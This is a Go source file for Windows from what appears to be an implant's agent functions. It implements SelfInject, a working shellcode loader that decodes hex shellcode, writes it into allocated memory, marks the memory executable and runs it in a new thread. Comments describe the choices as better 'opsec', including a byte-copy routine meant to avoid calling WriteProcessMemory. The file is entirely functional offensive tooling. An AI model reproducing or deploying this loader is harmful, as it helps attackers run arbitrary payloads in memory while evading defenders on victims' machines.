//go:build windows
// +build windows

package agentfuncs

import (
	winsyscall "github.com/nodauf/go-windows"
	"golang.org/x/sys/windows"
	"encoding/hex"
	"syscall"
	"unsafe"
)

// Credit:
// https://github.com/chvancooten/maldev-for-dummies/blob/main/Exercises/Exercise%201%20-%20Basic%20Shellcode%20Loader/solutions/golang/BasicShellcodeLoader.go

func SelfInject(shellcodeHex string) string {
	shellcode, err := hex.DecodeString(shellcodeHex)
	if err != nil {
		return "[!] Failed to decode hex: " + err.Error()
	}

	executableMemory, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return "[!] Failed to allocate memory: " + err.Error()
	}

	// Copy the shellcode into our assigned region of RW memory
	WriteMemory(shellcode, executableMemory)

	var oldfperms uint32
	// Mark shellcode as executable, better for opsec to do it this way
	err = windows.VirtualProtect(executableMemory, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldfperms)
	if err != nil {
		return "[!] Failed to change protections on memory: " + err.Error()
	}

	var threadHandle windows.Handle

	// Create a thread at the start of the executable shellcode to run it!
	threadHandle, err = winsyscall.CreateThread(nil, 0, executableMemory, 0, 0, nil)
	if err != nil {
		return "[!] Failed to create thread: " + err.Error()
	}

	// "Defer" can be used to clean up resources (threadHandle) when the function exits
	defer windows.CloseHandle(threadHandle)

	// Wait for our thread to exit to prevent program from closing before the shellcode ends
	_, err = windows.WaitForSingleObject(threadHandle, syscall.INFINITE)
	if err != nil {
		return "[!] Failed to waitForSingleObject: " + err.Error()
	}

	return "[+] Shellcode successfully executed!"
}


// WriteMemory writes the provided memory to the specified memory address. Does **not** check permissions, may cause panic if memory is not writable etc.
// The function is from https://github.com/C-Sto/BananaPhone/blob/916e63b713df4c296464d75050490581d192cf13/pkg/BananaPhone/functions.go#L84
// The OPSEC is better as it avoid calling WriteProcessMemory()
func WriteMemory(inbuf []byte, destination uintptr) {
	for index := uint32(0); index < uint32(len(inbuf)); index++ {
		writePtr := unsafe.Pointer(destination + uintptr(index))
		v := (*byte)(writePtr)
		*v = inbuf[index]
	}
}